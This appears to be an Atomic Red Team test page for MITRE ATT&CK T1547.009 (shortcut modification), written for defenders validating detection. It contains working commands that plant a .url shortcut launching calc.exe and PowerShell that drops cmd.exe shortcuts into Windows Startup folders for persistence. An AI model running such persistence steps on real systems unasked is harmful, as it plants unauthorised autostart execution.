# T1547.009 - Boot or Logon Autostart Execution: Shortcut Modification
Adversaries may create or edit shortcuts to run a program during system boot or user login. Shortcuts or symbolic links are ways of referencing other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.

Adversaries could use shortcuts to execute their tools for persistence. They may create a new shortcut as a means of indirection that may use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like a legitimate program. Adversaries could also edit the target path or entirely replace an existing shortcut so their tools will be executed instead of the intended legitimate program.

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Shortcut Modification
This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;
gci -path "C:\Users" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern "exe" | FL.
Upon execution, calc.exe will be launched.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
echo [InternetShortcut] > #{shortcut_file_path}
echo URL=C:\windows\system32\calc.exe >> #{shortcut_file_path}
#{shortcut_file_path}
```

Invoke-AtomicTest T1547.009 -TestNumbers 1

### Atomic Test #2 - Create shortcut to cmd in startup folders
LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
to view the new shortcut.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk")
$ShortCut.TargetPath="cmd.exe"
$ShortCut.WorkingDirectory = "C:\Windows\System32";
$ShortCut.WindowStyle = 1;
$ShortCut.Description = "T1547.009.";
$ShortCut.Save()

$Shell = New-Object -ComObject ("WScript.Shell")
$ShortCut = $Shell.CreateShortcut("$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk")
$ShortCut.TargetPath="cmd.exe"
$ShortCut.WorkingDirectory = "C:\Windows\System32";
$ShortCut.WindowStyle = 1;
$ShortCut.Description = "T1547.009.";
$ShortCut.Save()
```

Invoke-AtomicTest T1547.009 -TestNumbers 2

## Detection
Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.